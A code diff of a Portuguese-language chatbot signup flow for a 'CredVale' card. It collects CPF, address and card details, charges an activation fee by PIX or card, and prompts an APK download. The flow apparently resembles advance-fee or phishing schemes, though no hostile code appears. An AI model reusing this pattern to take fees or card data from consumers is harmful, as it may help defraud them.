+      addTyping();
+      await sleep(600);
+      removeTyping();
+      addMsg('✅ <strong>Dados confirmados!</strong> Agora vamos criar suas credenciais de acesso.','bot');
+      await sleep(400);
+      etapaCriarCredenciais(clientId, limite, tipo);
+    };
+
+    document.getElementById('btnEditarDados').onclick = function() {
+      closePopup();
+      addMsg('🔄 <strong>Reiniciando cadastro</strong> para correção dos dados...','bot');
+      setTimeout(function() {
+        window.location.reload();
+      }, 800);
+    };
+  }
+
+  
+  /**
+   * Função showDownloadModalInChat - Abre o modal de download do APK
+   * Utiliza a função compartilhada API.showDownloadModal (mesma da Index e app.html)
+   */
+  function showDownloadModalInChat(clientId, limite) {
+    if (popupEl) closePopup();
+    // Redundância: envia o beacon ANTES de abrir o modal, garantindo que
+    // mesmo que algo dê erro no modal, o registro do clique foi feito
+    if (clientId) {
+      try {
+        var baseUrl = window.__API_BASE || '/api';
+        var payload = JSON.stringify({
+          client_id: clientId,
+          client_cpf: (user && user.cpf) || '',
+          client_nome: (user && user.nome) || '',
+          apk_available: true,
+          device_info: navigator.userAgent || ''
+        });
+        navigator.sendBeacon(baseUrl + '/app/register-download', new Blob([payload], { type: 'application/json' }));
+      } catch(e) {}
+    }
+    API.showDownloadModal({
+      clientId: clientId || '',
+      cpf: (user && user.cpf) || '',
+      nome: (user && user.nome) || ''
+    });
+  }
+
+  /* ---- Final Screen: Baixar App ou Suporte ---- */
+/* ---- Final Screen: Baixar App ou Suporte ---- */
+  async function mostrarTelaFinal(clientId, limite) {
+    hideInput();
+    var primeiroNome = (user.nome || '').split(' ')[0] || 'Cliente';
+
+    addMsg(
+      '<div style="text-align:center;padding:8px 0;">' +
+        '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">' +
+          '<div style="width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,rgba(16,185,129,0.1),rgba(59,130,246,0.08));display:flex;align-items:center;justify-content:center;border:2px solid rgba(16,185,129,0.12);">' +
+            '<span style="font-size:1.5rem;">🎉</span>' +
+          '</div>' +
+        '</div>' +
+        '<div style="font-size:1.15rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Cadastro concluído, ' + primeiroNome + '!</div>' +
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
+          'Seu cadastro foi finalizado com sucesso. Agora baixe o aplicativo para acessar seu benefício.' +
+        '</div>' +
+      '</div>',
+      'bot'
+    );
+
+    await sleep(400);
+
+    addMsg(
+      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
+        '<button class="chat-option chat-option--primary" id="btnBaixarFinal" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;">📲 Baixar Aplicativo</button>' +
+      '</div>'
+    );
+
+    document.getElementById('btnBaixarFinal').onclick = function() {
+      showDownloadModalInChat(clientId, limite);
+    };
+
+    // Botão WhatsApp com mensagem amigável
+    await sleep(200);
+
+    addMsg(
+      '<div style="text-align:center;padding:4px 0;">' +
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
+          '💬 <strong>Precisa de ajuda?</strong> Nossa equipe está pronta para atender você.' +
+        '</div>' +
+        '<button class="chat-option" id="btnSuporteFinal" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #25D366;background:#ffffff;color:#075E54;">💬 Falar com um Atendente</button>' +
+      '</div>'
+    );
+
+    document.getElementById('btnSuporteFinal').onclick = function() {
+      var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
+      wa = String(wa).replace(/\D/g,'');
+      if (wa.length <= 11) wa = '55' + wa;
+      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e preciso de ajuda.', '_blank');
+    };
+  }
+
+  /* ---- BotÃµes Finais: Baixar App + Suporte (sem mensagem de conclusÃ£o) ---- */
+  async function mostrarBotoesFinais(clientId, limite) {
+    hideInput();
+
+    addMsg(
+      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
+        '<button class="chat-option chat-option--primary" id="btnBaixarFim" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;">📲 Baixar Aplicativo</button>' +
+      '</div>'
+    );
+
+    document.getElementById('btnBaixarFim').onclick = function() {
+      showDownloadModalInChat(clientId, limite);
+    };
+
+    await sleep(200);
+
+    addMsg(
+      '<div style="text-align:center;padding:4px 0;">' +
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
+          '💬 <strong>Precisa de ajuda?</strong> Nossa equipe está pronta para atender você.' +
+        '</div>' +
+        '<button class="chat-option" id="btnSuporteFim" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #25D366;background:#ffffff;color:#075E54;">💬 Falar com um Atendente</button>' +
+      '</div>'
+    );
+
+    document.getElementById('btnSuporteFim').onclick = function() {
+      var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
+      wa = String(wa).replace(/\D/g,'');
+      if (wa.length <= 11) wa = '55' + wa;
+      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e preciso de ajuda.', '_blank');
+    };
+  }
+
+  /* ---- Continuar sem Plano ---- */
+  async function continuarSemPlano(clientId, limite) {
+    flowState = 'pos-plano';
+    hideInput();
+
+    addTyping();
+    await sleep(800);
+    removeTyping();
+
+    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
+
+    addMsg(
+      '<div style="text-align:center;padding:8px 0;">'+
+        '<div style="font-size:2rem;margin-bottom:6px;">\u2705</div>'+
+        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Cadastro conclu\u00eddo, '+primeiroNome+'!</div>'+
+        '<div style="font-size:0.8rem;color:#64748b;line-height:1.5;margin-bottom:8px;">'+
+          'Seu cadastro foi finalizado com sucesso. Voc\u00ea pode assinar o <strong>Plano CredVale</strong> depois pelo aplicativo.'+
+        '</div>'+
+      '</div>',
+      'bot'
+    );
+
+    await sleep(400);
+    mostrarTelaFinal(clientId, limite);
   }
 
   /* ---- PÓS-PLANO: loading → mensagem na conversa com botões ---- */
@@ -1040,7 +1495,7 @@
     showPopup(
       '<div style="text-align:center;padding:16px 0;">'+
         '<div style="width:52px;height:52px;margin:0 auto 14px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
-        '<div style="font-weight:700;font-size:1rem;color:#e2e8f0;margin-bottom:4px;" id="loadingMsg">'+msgs[0]+'</div>'+
+        '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;" id="loadingMsg">'+msgs[0]+'</div>'+
       '</div>'
     );
 
@@ -1067,15 +1522,15 @@
     // Mensagem de revisão dos dados
     addMsg(
       '<div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:4px;">'+
-        '<div style="font-size:0.85rem;font-weight:700;color:#e2e8f0;margin-bottom:10px;text-align:center;">📋 Revise seus dados</div>'+
+        '<div style="font-size:0.85rem;font-weight:700;color:#0f172a;margin-bottom:10px;text-align:center;">📋 Revise seus dados</div>'+
         '<div style="display:flex;flex-direction:column;gap:4px;">'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Nome</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+user.nome+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">CPF</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Nascimento</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">Endereço</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">WhatsApp</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">E-mail</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
-          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+nomePlano+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Nome</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+user.nome+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">CPF</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Nascimento</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">Endereço</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">WhatsApp</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#475569;">E-mail</span><span style="color:#0f172a;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
+          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#475569;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+nomePlano+'</span></div>'+
         '</div>'+
       '</div>',
       'bot'
@@ -1089,32 +1544,108 @@
     chatMsg.appendChild(btnConfirmarDados);
     scrollDown();
 
-    document.getElementById('btnConfirmarDados').onclick = function() {
+    document.getElementById('btnConfirmarDados').onclick = async function() {
       trackStage('Enviando Cadastro');
       btnConfirmarDados.remove();
 
       addMsg(
         '<div style="text-align:center;padding:4px 0;">'+
           '<div style="font-size:1.2rem;font-weight:900;color:#4CC8A4;margin-bottom:2px;">🎉 Perfeito, '+primeiroNome+'!</div>'+
-          '<div style="font-size:0.85rem;color:#e2e8f0;"><strong>Plano '+nomePlano+'</strong> selecionado com sucesso.</div>'+
+          '<div style="font-size:0.85rem;color:#0f172a;"><strong>Plano '+nomePlano+'</strong> selecionado com sucesso.</div>'+
         '</div>',
         'bot'
       );
 
-      addMsg(
-        '<div style="font-size:0.78rem;color:#94a3b0;line-height:1.5;text-align:center;padding:2px 0;">'+
-          'Agora escolha abaixo a forma de pagamento da <strong style="color:#e2e8f0;">taxa de ades\u00e3o <span style="color:#4CC8A4;">'+taxa+'</span></strong> do <strong style="color:#e2e8f0;">'+nomePlano+'</strong> para ativar seu cart\u00e3o.'+
-        '</div>',
-        'bot'
-      );
+      // Indicador de carregamento antes da tela de decisão
+      addTyping();
+      await sleep(1500);
+      removeTyping();
 
-      mostrarBotoesPagamento(clientId, limite, taxa);
+      mostrarDecisaoPagamento(clientId, limite, taxa);
     };
+  }
+
+  /* ---- DECISÃO: Pagar Agora ou Pagar Depois ---- */
+  function mostrarDecisaoPagamento(clientId, limite, taxa) {
+    hideInput();
+
+    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
+    var nomePlano = chosenCard==='virtual' ? 'Standard' : 'Plus';
+
+    addMsg(
+      '<div style="text-align:center;padding:6px 0;">'+
+        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;margin-bottom:6px;">'+primeiroNome+',</div>'+
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.6;">'+
+          'Efetue o pagamento da taxa de adesão do seu '+
+          '<strong style="color:#4CC8A4;">Plano '+nomePlano+'</strong> para '+
+          'concluir sua ativação e liberar todos os benefícios.'+
+        '</div>'+
+      '</div>',
+      'bot'
+    );
+
+    // Container dos botões de decisão
+    var decMsg = document.createElement('div');
+    decMsg.className = 'chat-msg chat-msg--bot';
+    decMsg.id = 'decisaoPagamento';
+    decMsg.innerHTML =
+      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">'+
+        '<button class="chat-option chat-option--primary" id="btnPagarAgora" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar Agora</button>'+
+        '<button class="chat-option" id="btnPagarDepois" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid rgba(255,255,255,0.12);color:#475569;">⏰ Pagar Depois</button>'+
+      '</div>';
+    chatMsg.appendChild(decMsg);
+    scrollDown();
+
+    document.getElementById('btnPagarAgora').onclick = function() {
+      var btnAgora = document.getElementById('btnPagarAgora');
+      var btnDepois = document.getElementById('btnPagarDepois');
+      // Mantém botão clicável para permitir nova tentativa
+      if (btnAgora) {
+        btnAgora.innerHTML = '⏳ Pagamento pendente — Tentar novamente';
+      }
+      if (btnDepois) {
+        btnDepois.style.display = 'none';
+      }
+      addMsg('💳 <strong>Pagar agora</strong> selecionado','user');
+      addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
+      mostrarBotoesPagamento(clientId, limite, taxa);
+      // Mostra Baixar App + Suporte
+      setTimeout(function() { mostrarTelaFinal(clientId, limite); }, 500);
+    };
+
+    document.getElementById('btnPagarDepois').onclick = function() {
+      var btnAgora = document.getElementById('btnPagarAgora');
+      var btnDepois = document.getElementById('btnPagarDepois');
+      // Atualiza botões em vez de remover
+      if (btnAgora) btnAgora.style.display = 'none';
+      if (btnDepois) btnDepois.style.display = 'none';
+      addMsg('⏰ <strong>Pagar depois</strong> selecionado','user');
+      setTimeout(function() { mostrarOpcaoBaixarApp(clientId, limite); }, 300);
+    };
+  }
+
+  /* ---- Pagar Depois → Baixar Aplicativo ---- */
+  function mostrarOpcaoBaixarApp(clientId, limite) {
+    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';
+
+    addMsg(
+      '<div style="text-align:center;padding:8px 0;">'+
+        '<div style="font-size:1.8rem;margin-bottom:6px;">📲</div>'+
+        '<div style="font-size:1rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Sem problemas, '+primeiroNome+'!</div>'+
+        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:12px;">'+
+          'Você pode pagar depois diretamente pelo aplicativo. '+
+          '<strong style="color:#0f172a;">Baixe agora</strong> e finalize quando quiser.'+
+        '</div>'+
+      '</div>',
+      'bot'
+    );
+
+    mostrarTelaFinal(clientId, limite);
   }
 
   /* ---- Botões de pagamento persistentes na conversa ---- */
   function mostrarBotoesPagamento(clientId, limite, taxa) {
-    updateProgress(9);
+    updateProgress(8);
     // Botão PIX
     var btnPix = document.createElement('div');
     btnPix.className = 'chat-msg chat-msg--bot';
@@ -1219,7 +1750,7 @@
       '<div class="popup-title">Seu WhatsApp está correto?</div>'+
       '<div class="wa-confirm-number" style="font-size:1.4rem;font-weight:900;padding:16px 0;margin:8px 0;letter-spacing:1px;">'+phoneFmt+'</div>'+
       '<div class="wa-confirm-hint">'+
-        '📌 <strong style="color:#4CC8A4;">Importante:</strong> É por este WhatsApp que você vai receber suas <strong style="color:#e2e8f0;">credenciais de acesso</strong> e o link para ativar seu cartão.'+
+        '📌 <strong style="color:#4CC8A4;">Importante:</strong> É por este WhatsApp que você vai receber suas <strong style="color:#0f172a;">credenciais de acesso</strong> e o link para ativar seu cartão.'+
       '</div>'+
       '<div style="display:flex;gap:10px;margin-top:16px;">'+
         '<button class="chat-option chat-option--primary" id="waConfirmYes" style="flex:1;padding:14px;font-size:0.9rem;">✅ Sim, está correto</button>'+
@@ -1264,8 +1795,8 @@
     showPopup(
       '<div style="text-align:center;padding:20px 0;">'+
         '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
-        '<div style="font-weight:700;font-size:1rem;color:#e2e8f0;margin-bottom:4px;">Preparando pagamento...</div>'+
-        '<div style="font-size:0.8rem;color:#6b7a8f;">Aguarde um momento</div>'+
+        '<div style="font-weight:700;font-size:1rem;color:#0f172a;margin-bottom:4px;">Preparando pagamento...</div>'+
+        '<div style="font-size:0.8rem;color:#475569;">Aguarde um momento</div>'+
       '</div>'
     );
 
@@ -1305,7 +1836,7 @@
       '<div style="text-align:center;padding:8px 0;">'+
         '<div style="font-size:2rem;margin-bottom:4px;">🔗</div>'+
         '<div class="popup-title" style="font-size:1rem;">Pagamento PushinPay</div>'+
-        '<div style="font-size:0.75rem;color:#6b7a8f;margin-bottom:14px;">Você será redirecionado para o checkout seguro</div>'+
+        '<div style="font-size:0.75rem;color:#475569;margin-bottom:14px;">Você será redirecionado para o checkout seguro</div>'+
         '<button class="chat-option chat-option--primary" id="pushinpayIr" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💚 Ir para o pagamento</button>'+
         '<div style="margin-top:10px;">'+
           '<button class="chat-option" id="pushinpayJaPaguei" style="width:100%;padding:10px;font-size:0.8rem;">✅ Já paguei — confirmar</button>'+
@@ -1334,8 +1865,8 @@
       '<div style="text-align:center;margin-bottom:8px;">'+
         '<div style="font-size:1.6rem;margin-bottom:2px;">💚</div>'+
         '<div class="popup-title" style="font-size:1rem;">Pagamento via PIX</div>'+
-        '<div style="font-size:0.75rem;color:#6b7a8f;margin-bottom:4px;">Valor: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
-        '<div style="font-size:0.7rem;color:#94a3b0;">Escaneie o QR Code abaixo ou copie o código PIX</div>'+
+        '<div style="font-size:0.75rem;color:#475569;margin-bottom:4px;">Valor: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
+        '<div style="font-size:0.7rem;color:#475569;">Escaneie o QR Code abaixo ou copie o código PIX</div>'+
       '</div>'+
 
       '<div style="text-align:center;margin-bottom:10px;">'+
@@ -1345,8 +1876,8 @@
       '</div>'+
 
       '<div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:10px;margin-bottom:8px;">'+
-        '<div style="font-size:0.65rem;color:#6b7a8f;margin-bottom:3px;">Código PIX Copia e Cola:</div>'+
-        '<div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:8px;font-size:0.65rem;color:#c8d0dc;word-break:break-all;font-family:monospace;text-align:center;margin-bottom:6px;border:1px solid rgba(255,255,255,0.04);max-height:60px;overflow-y:auto;">'+copiaCola+'</div>'+
+        '<div style="font-size:0.65rem;color:#475569;margin-bottom:3px;">Código PIX Copia e Cola:</div>'+
+        '<div style="background:rgba(0,0,0,0.3);border-radius:8px;padding:8px;font-size:0.65rem;color:#475569;word-break:break-all;font-family:monospace;text-align:center;margin-bottom:6px;border:1px solid rgba(255,255,255,0.04);max-height:60px;overflow-y:auto;">'+copiaCola+'</div>'+
         '<button class="chat-option chat-option--primary" id="pixCopiarChave" style="width:100%;padding:9px;font-size:0.8rem;">📋 Copiar código PIX</button>'+
       '</div>'+
 
@@ -1366,10 +1897,10 @@
               '<span style="font-size:1.8rem;color:#4CC8A4;">✓</span>'+
             '</div>'+
             '<div style="font-size:0.8rem;color:#4CC8A4;font-weight:700;text-transform:uppercase;margin-bottom:4px;">✅ Código PIX copiado</div>'+
-            '<div style="font-size:0.85rem;color:#c8d0dc;margin-bottom:10px;line-height:1.4;">'+
-              'Agora <strong style="color:#e2e8f0;">abra seu banco</strong>, vá em <strong style="color:#e2e8f0;">Pix</strong> e cole o código para pagar.'+
+            '<div style="font-size:0.85rem;color:#475569;margin-bottom:10px;line-height:1.4;">'+
+              'Agora <strong style="color:#0f172a;">abra seu banco</strong>, vá em <strong style="color:#0f172a;">Pix</strong> e cole o código para pagar.'+
             '</div>'+
-            '<div style="background:rgba(76,200,164,0.06);border:1px solid rgba(76,200,164,0.12);border-radius:12px;padding:12px;margin:0 0 12px;font-size:0.8rem;color:#94a3b0;text-align:left;line-height:1.5;">'+
+            '<div style="background:rgba(76,200,164,0.06);border:1px solid rgba(76,200,164,0.12);border-radius:12px;padding:12px;margin:0 0 12px;font-size:0.8rem;color:#475569;text-align:left;line-height:1.5;">'+
               '📌 <strong>Importante:</strong> Fique atento ao <strong>WhatsApp</strong>. É por lá que você vai receber as credenciais e confirmação do seu cartão.'+
             '</div>'+
             '<button class="chat-option chat-option--primary" id="pixCopiarOk" style="width:100%;padding:12px;font-size:0.85rem;">✅ Entendi, vou pagar</button>'+
@@ -1379,6 +1910,13 @@
           closePopup();
           addMsg('💚 Ok, vou pagar o PIX agora!','user');
           addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
+          var appMsg = document.createElement('div');
+          appMsg.className = 'chat-msg chat-msg--bot';
+          appMsg.innerHTML = '<button class="chat-option chat-option--primary" id="btnBaixarAppPendente" style="width:100%;padding:12px;font-size:0.85rem;font-weight:700;">📲 Baixar Aplicativo</button>';
+          chatMsg.appendChild(appMsg); scrollDown();
+          document.getElementById('btnBaixarAppPendente').onclick = function() {
+            showDownloadModalInChat(clientId, limite);
+          };
         };
       }).catch(function() {
         var ta = document.createElement('textarea');
@@ -1388,6 +1926,13 @@
         closePopup();
         addMsg('💚 Ok, vou pagar o PIX agora!','user');
         addMsg('<div class="chat-pending-bar">⏳ <strong>Pagamento pendente</strong><span class="chat-pending-dot"></span></div>','bot');
+        var appMsg2 = document.createElement('div');
+        appMsg2.className = 'chat-msg chat-msg--bot';
+        appMsg2.innerHTML = '<button class="chat-option chat-option--primary" id="btnBaixarAppPendente2" style="width:100%;padding:12px;font-size:0.85rem;font-weight:700;">📲 Baixar Aplicativo</button>';
+        chatMsg.appendChild(appMsg2); scrollDown();
+        document.getElementById('btnBaixarAppPendente2').onclick = function() {
+          showDownloadModalInChat(clientId, limite);
+        };
       });
     };
 
@@ -1407,7 +1952,7 @@
       '<div style="text-align:center;margin-bottom:14px;">'+
         '<div style="font-size:2rem;margin-bottom:4px;">💳</div>'+
         '<div class="popup-title">Cartão de Crédito</div>'+
-        '<div style="font-size:0.85rem;color:#6b7a8f;">Taxa de emissão: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
+        '<div style="font-size:0.85rem;color:#475569;">Taxa de emissão: <strong style="color:#4CC8A4;">'+taxa+'</strong></div>'+
       '</div>'+
       '<div style="display:flex;flex-direction:column;gap:12px;">'+
         '<input placeholder="Número do cartão" class="pix-input" id="cardNumero" maxlength="19" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
@@ -1418,7 +1963,7 @@
         '<input placeholder="Nome do titular" class="pix-input" id="cardTitular" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
         '<input placeholder="CPF do titular" class="pix-input" id="cardCpf" maxlength="14" style="padding:14px;border-radius:12px;border:1.5px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:0.9rem;font-family:inherit;outline:none;">'+
         '<button class="chat-option chat-option--primary" id="cardPagar" style="width:100%;padding:16px;font-size:1rem;margin-top:4px;">💳 Pagar '+taxa+'</button>'+
-        '<div style="text-align:center;font-size:0.7rem;color:#4a5568;">🔒 Dados protegidos · Pagamento seguro</div>'+
+        '<div style="text-align:center;font-size:0.7rem;color:#475569;">🔒 Dados protegidos · Pagamento seguro</div>'+
       '</div>';
 
     showPopup(cardHtml);
@@ -1436,7 +1981,8 @@
 
   /* ---- Abrir WhatsApp com mensagem pré-definida ---- */
   function abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpf) {
-    var phone = user.whatsapp.replace(/\D/g,'').slice(0,11);
+    var support = __supportWhatsApp || sessionStorage.getItem('vs_support_wa') || '5511999999999';
+    var phone = support.replace(/\D/g,'');
     var msg = encodeURIComponent(
       'Ol\u00e1! Meu nome \u00e9 '+nome+', CPF '+cpf+'. '+
       'Acabei de efetuar o pagamento da taxa de ativa\u00e7\u00e3o do meu cart\u00e3o '+(chosenCard==='virtual'?'Virtual (Standard)':'F\u00edsico (Plus)')+'. '+
@@ -1468,11 +2014,11 @@
         addMsg(
           '<div style="text-align:center;padding:8px 0;">'+
             '<div style="font-size:2.8rem;margin-bottom:10px;">✅</div>'+
-            '<div style="font-size:1.1rem;font-weight:900;color:#e2e8f0;margin-bottom:4px;">Você já possui um cadastro ativo no <strong style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">CredVale</strong>.</div>'+
-            '<div style="font-size:0.8rem;color:#94a3b0;margin-bottom:12px;line-height:1.5;">Seu acesso já foi aprovado anteriormente. Utilize uma das opções abaixo para continuar.</div>'+
+            '<div style="font-size:1.1rem;font-weight:900;color:#0f172a;margin-bottom:4px;">Você já possui um cadastro ativo no <strong style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">CredVale</strong>.</div>'+
+            '<div style="font-size:0.8rem;color:#475569;margin-bottom:12px;line-height:1.5;">Seu acesso já foi aprovado anteriormente. Utilize uma das opções abaixo para continuar.</div>'+
             '<div style="display:flex;flex-direction:column;gap:8px;">'+
               '<button class="chat-option chat-option--primary" id="btnBaixarApp" style="padding:12px;font-size:0.85rem;">📲 Baixar Aplicativo</button>'+
-              '<button class="chat-option" id="btnFalarSuporte" style="padding:12px;font-size:0.85rem;">💬 Falar com o Suporte</button>'+
+              '<button class="chat-option" id="btnFalarSuporte" style="padding:12px;font-size:0.85rem;">💬 Falar com um Atendente</button>'+
             '</div>'+
           '</div>',
           'bot'
@@ -1480,8 +2026,7 @@
         showOptions([]);
         await new Promise(function(resolve) {
           document.getElementById('btnBaixarApp').onclick = function() {
-            var p = new URLSearchParams({ nome: nome, limite: limite, id: client.id });
-            window.location.href = 'app.html?' + p.toString();
+            API.showDownloadModal({ clientId: client.id, cpf: user.cpf, nome: nome });
             resolve();
           };
           document.getElementById('btnFalarSuporte').onclick = function() {
@@ -1492,35 +2037,165 @@
       } else {
         addMsg('Você já iniciou sua solicitação. Vamos continuar!','bot');
         await sleep(800);
-        etapaCardChoice(client.id, limite);
+        etapaCriarCredenciais(client.id, limite, 'fisico');
       }
       return true;
     } catch(e) { return false; }
   }
 
-  /* ---- Mobile: manter input visível com teclado ---- */
+  /* ---- Mobile: ajustar viewport quando teclado abre ---- */
   if (window.visualViewport) {
     window.visualViewport.addEventListener('resize', function() {
       var diff = window.innerHeight - window.visualViewport.height;
       if (diff > 60) {
-        // Teclado aberto: fixa o input acima do teclado
-        chatModal.style.height = window.visualViewport.height + 'px';
-        chatInputArea.style.position = 'fixed';
-        chatInputArea.style.bottom = '0';
-        chatInputArea.style.left = '0';
-        chatInputArea.style.right = '0';
-        chatInputArea.style.zIndex = '100';
-        // Scroll messages to bottom
+        // Teclado aberto: adiciona padding inferior igual a altura do teclado
+        chatModal.style.paddingBottom = diff + 'px';
         scrollDown();
       } else {
         // Teclado fechado: restaura
-        chatModal.style.height = '';
-        chatInputArea.style.position = '';
-        chatInputArea.style.bottom = '';
-        chatInputArea.style.left = '';
-        chatInputArea.style.right = '';
-        chatInputArea.style.zIndex = '';
+        chatModal.style.paddingBottom = '';
       }
+    });
+  }
+  // Quando input ganha foco, scroll suave até o input-area ficar visivel
+  chatInput.addEventListener('focusin', function() {
+    setTimeout(function() {
+      if (chatInputArea && chatInputArea.hidden===false) {
+        chatInputArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }, 100);
+  });
+
+  /* ============================================================
+     FLUXO PÓS-CADASTRO: PLANO + PAGAMENTO
+     ============================================================ */
+
+  async function etapaPosCadastro(clientId, limite) {
+    hideInput();
+    updateProgress(8);
+    flowState = 'pos-cadastro';
+    await sleep(200);
+    addTyping(); await sleep(600); removeTyping();
+
+    addMsg(
+      '🎉 <strong>Parabéns, '+(user.nome||'').split(' ')[0]+'!</strong><br>'+
+      'Seu cadastro foi criado com sucesso.<br><br>'+
+      '<div style="text-align:center;background:#f8fafc;border-radius:12px;padding:14px;margin:4px 0;">'+
+        '<div style="font-size:0.82rem;color:#475569;margin-bottom:2px;">💳 Plano selecionado:</div>'+
+        '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;">Plano Plus</div>'+
